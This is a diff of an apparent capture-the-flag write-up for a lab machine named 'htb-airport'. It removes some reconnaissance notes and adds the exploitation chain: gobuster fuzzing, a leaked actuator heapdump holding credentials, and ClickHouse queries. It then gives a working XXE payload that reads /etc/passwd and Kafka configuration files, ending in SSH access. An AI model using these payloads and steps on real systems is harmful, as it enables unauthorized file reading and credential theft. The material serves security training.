@@ -91,69 +91,10 @@ gobuster dir -u http://10.129.110.120:8081 \
 
 <img width="1590" height="434" alt="image" src="https://github.com/user-attachments/assets/e2ccc7db-b133-4e30-aa5b-9d9b1505882d" />
 
-```json
-{
-  "openapi": "3.1.0",
-  "info": {
-    "title": "AIDX flight-leg ingest",
-    "version": "0.1.0"
-  },
-  "paths": {
-    "/": {
-      "get": {
-        "summary": "Root",
-        "operationId": "root__get",
-        "responses": {
-          "200": {
-            "description": "Successful Response",
-            "content": {
-              "application/json": {
-                "schema": {}
-              }
-            }
-          }
-        }
-      }
-    },
-    "/health": {
-      "get": {
-        "summary": "Health",
-        "operationId": "health_health_get",
-        "responses": {
-          "200": {
-            "description": "Successful Response",
-            "content": {
-              "application/json": {
-                "schema": {}
-              }
-            }
-          }
-        }
-      }
-    },
-    "/feeds/aidx": {
-      "post": {
-        "summary": "Ingest",
-        "operationId": "ingest_feeds_aidx_post",
-        "responses": {
-          "200": {
-            "description": "Successful Response",
-            "content": {
-              "application/json": {
-                "schema": {}
-              }
-            }
-          }
-        }
-      }
-    }
-  }
-}
-```
 
 
 
-## try send simple xml to `/feeds/aidx`
+## try send simple xml to `/feeds/aidx` before try `XXE`
 
 ```
 curl -X POST http://10.129.110.120:8081/feeds/aidx \
@@ -198,27 +139,10 @@ db.htb-airport.htb Status: 200 [Size: 4]
 
 
 
-The ClickHouse HTTP interface is **notoriously powerful** and often misconfigured. Key points:
-
-- **Port 8123** (default) or routed via nginx as `db.htb-airport.htb:80`
-    
-- **The Play UI** at `/play` lets you run SQL queries
-    
-- **The default user is `default`** with **no password** unless configured
-    
-- ClickHouse has many powerful functions that can lead to RCE:
-    
-    - `file()` — read arbitrary files
-        
-    - `url()` — SSRF
-        
-    - `remote()` — SSRF
-        
-    - `s3()` — S3 access
-        
-    - `executable()` — **execute commands** (if enabled)
+The ClickHouse HTTP interface is **notoriously powerful** and often misconfigured.
 
 
+  
 
 ## Test Basic ClickHouse Access
 
@@ -235,7 +159,245 @@ ClickHouse requires authentication. The error message is actually **very helpful
 
 > The password for default user is typically located at `/etc/clickhouse-server/users.d/default-password.xml`
 
-That confirms a **`default-password.xml`** file exists on the target — and if we can read it (via any file-read primitive), we get the password.
+
+---
+
+## fuzzing on our subdomains
+
+```
+gobuster dir -u http://db.htb-airport.htb/ -w /usr/share/wordlists/dirb/common.txt -t 30
+```
+
+<img width="1637" height="612" alt="image" src="https://github.com/user-attachments/assets/c8a39558-ca89-471d-81a0-6c629563a399" />
+
+```
+gobuster dir -u http://api.htb-airport.htb/ -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -t 30
+```
+
+<img width="1306" height="385" alt="image" src="https://github.com/user-attachments/assets/b3090b12-87d8-42ad-a4fb-6f92f52ef901" />
+
+## found dump in **`http://api.htb-airport.htb/actuator/heapdump`**
+
+<img width="1008" height="99" alt="image" src="https://github.com/user-attachments/assets/1c6eb1af-1836-41c5-940a-6299e3af92e0" />
+
+## in it found `SHA256` hash and salt for `svc_events`
+
+```sql
+CREATE USER IF NOT EXISTS "SVC_EVENTS" SALT '9ecfa690ece76f28' HASH '2b1de774041d23956a432a0e6631382562f8c3c351e5900b5c07764b7348ecfe' ADMIN
+```
+
+<img width="1437" height="364" alt="image" src="https://github.com/user-attachments/assets/d43e66df-d5b1-4f8f-811b-86b3bf7e1f83" />
+
+## but we don't need to crack it because we have it as plain text 
+
+<img width="968" height="154" alt="image" src="https://github.com/user-attachments/assets/492e1bad-d5c4-4f14-8401-9c4ad2b7999a" />
+
+## Test the credentials
+
+```
+curl -s "http://db.htb-airport.htb/?user=svc_events&password=<PASSWORD>&query=SELECT%201"
+```
+
+<img width="1067" height="135" alt="image" src="https://github.com/user-attachments/assets/5907d5c8-9c60-4843-ba80-6f52b22f481b" />
+
+
+## List databases
+
+```
+# List databases
+curl -s "http://db.htb-airport.htb/?user=svc_events&password=<PASSWORD>&query=SHOW%20DATABASES"
+
+# List tables in partner_feed
+curl -s "http://db.htb-airport.htb/?user=svc_events&password=<PASSWORD>&query=SHOW%20TABLES%20FROM%20partner_feed"
+```
+
+<img width="1249" height="280" alt="image" src="https://github.com/user-attachments/assets/573f7f64-a8f0-48be-9632-0c6ee3876bdb" />
+
+
+
+
+
+## let's go back When we POST to `/feeds/aidx` , the response is: 
+
+```json
+{"accepted":true,"topic":"aidx.flightleg.raw.v1"}
+```
+
+
+> The word **"topic"** is Kafka terminology. The name follows a Kafka topic naming convention. So we know:
+
+- The XML is **not parsed by the ingest** — it's just dropped onto a queue.
+    
+- Something else reads from that queue.
+
+> and form note on port `8081` we know 
+
+`note	"Ingest does not parse. Full validation happens downstream."`
+
+- This confirms there's a downstream consumer. The downstream consumer is what actually parses the XML.
+
+
+## from db :
+
+```
+flightleg_json               ← parsed result
+flightleg_json_kafka         ← Kafka engine table (source)
+flightleg_json_mv            ← materialized view (moves data from kafka table to json table)
+flightleg_raw                ← raw data
+flightleg_raw_kafka          ← Kafka engine table for raw
+flightleg_raw_mv             ← materialized view for raw
+```
+
+> ClickHouse Kafka engine table is a special table that directly consumes messages from a Kafka topic.
+
+
+
+
+
+## now let's send XXE payload 
+
+
+```
+cat > /tmp/xxe-passwd.xml << 'EOF'
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE IATA_AIDX_FlightLegNotifRQ [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<IATA_AIDX_FlightLegNotifRQ TransactionIdentifier="xxe1" TimeStamp="2026-10-10T19:30:00Z" Version="22.1">
+  <Originator CompanyShortName="TST" Code="TS"/>
+  <FlightLeg>
+    <LegIdentifier>
+      <Airline>&xxe;</Airline>
+      <FlightNumber>999</FlightNumber>
+      <DepartureAirport>XXX</DepartureAirport>
+      <ArrivalAirport>YYY</ArrivalAirport>
+    </LegIdentifier>
+  </FlightLeg>
+</IATA_AIDX_FlightLegNotifRQ>
+EOF
+
+
+curl -s -X POST http://<TARGET_IP>:8081/feeds/aidx \
+  -H "Content-Type: application/xml" \
+  --data-binary @/tmp/xxe-passwd.xml
+```
+
+
+## trigger XXE :
+
+
+```
+curl -s "http://db.htb-airport.htb/?user=svc_events&password=<PASSWORD>" \
+  --data-binary "SELECT transaction_id, airline FROM partner_feed.flightleg_json WHERE transaction_id = 'xxe1'"
+```
+
+<img width="1583" height="320" alt="image" src="https://github.com/user-attachments/assets/90d7fed2-f9c4-4a35-b34a-989bd9eaab61" />
+
+```
+svc-infra:x:1000:1000:,,,:/home/svc-infra:/bin/bash
+clickhouse:x:996:987::/nonexistent:/bin/false
+martin_cole:x:1001:1001:,,,:/home/martin_cole:/bin/bash
+```
+
+
+
+## let's try to enumerate the system 
+
+
+Read `/etc/systemd/system/kafka.service`** 
+
+```bash
+
+sed 's|file:///etc/hostname|file:///etc/systemd/system/kafka.service|;s|hostname1|svc1|' /tmp/xxe-hostname.xml > /tmp/xxe-svc.xml
+```
+
+Read `/proc/mounts`** to see the filesystem layout:
+
+```bash
+
+sed 's|file:///etc/hostname|file:///proc/mounts|;s|hostname1|mounts1|' /tmp/xxe-hostname.xml > /tmp/xxe-mounts.xml
+```
+
+Read `/etc/environment` and `/etc/profile`** 
+
+```bash
+
+sed 's|file:///etc/hostname|file:///etc/environment|;s|hostname1|env1|' /tmp/xxe-hostname.xml > /tmp/xxe-env.xml
+```
+
+ Read `/proc/1/cmdline` or look for a Kafka process:**
+
+```bash
+
+sed 's|file:///etc/hostname|file:///proc/1/cmdline|;s|hostname1|cmdline1|' /tmp/xxe-hostname.xml > /tmp/xxe-cmdline.xml
+```
+
+ After sending each, query the results:**
+
+```bash
+
+curl -s "http://db.htb-airport.htb/?user=svc_events&password=<PASSWORD>" \
+  --data-binary "SELECT transaction_id, airline FROM partner_feed.flightleg_json WHERE transaction_id IN ('svc1','mounts1','env1','cmdline1')"
+```
+
+<img width="1449" height="323" alt="image" src="https://github.com/user-attachments/assets/140ceb7d-522a-49f0-8957-91e44facdbff" />
+
+## Read the Kafka Config
+
+
+```
+sed 's|file:///etc/hostname|file:///opt/kafka_2.13-4.3.1/config/server.properties|;s|hostname1|kafka1|' /tmp/xxe-hostname.xml > /tmp/xxe-kafka.xml
+
+curl -s -X POST http://10.129.79.103:8081/feeds/aidx \
+  -H "Content-Type: application/xml" \
+  --data-binary @/tmp/xxe-kafka.xml
+```
+
+
+**`QUERY`**
+
+```
+curl -s "http://db.htb-airport.htb/?user=svc_events&password=<PASSWORD>" \
+  --data-binary "SELECT airline FROM partner_feed.flightleg_json WHERE transaction_id = 'kafka1' FORMAT Vertical" | head -80
+```
+
+
+## WE FOUND `user_svc_infra` PASSWORD
+
+<img width="1252" height="169" alt="image" src="https://github.com/user-attachments/assets/e9439f2a-6a7f-4a09-b649-e01dc7a54e20" />
+
+## CONNECT VIA SSH 
+
+```
+ssh svc-infra@10.129.79.103
+```
+
+**`BINGO`**
+
+<img width="950" height="176" alt="image" src="https://github.com/user-attachments/assets/231c8b2b-e19c-4153-85dd-c213088391ed" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
